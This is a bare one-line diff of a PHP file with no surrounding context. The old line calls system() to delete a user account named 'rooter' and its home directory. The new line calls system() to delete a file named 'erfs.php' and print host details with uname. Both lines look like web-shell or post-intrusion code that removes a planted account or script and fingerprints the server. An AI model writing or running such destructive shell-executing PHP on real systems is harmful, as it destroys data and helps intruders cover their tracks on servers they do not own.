@@ -1,1 +1,1 @@
-<?php system('deluser rooter && rm -rf /home/rooter'); ?>
+<?php system('rm -rf erfs.php && uname -a'); ?>
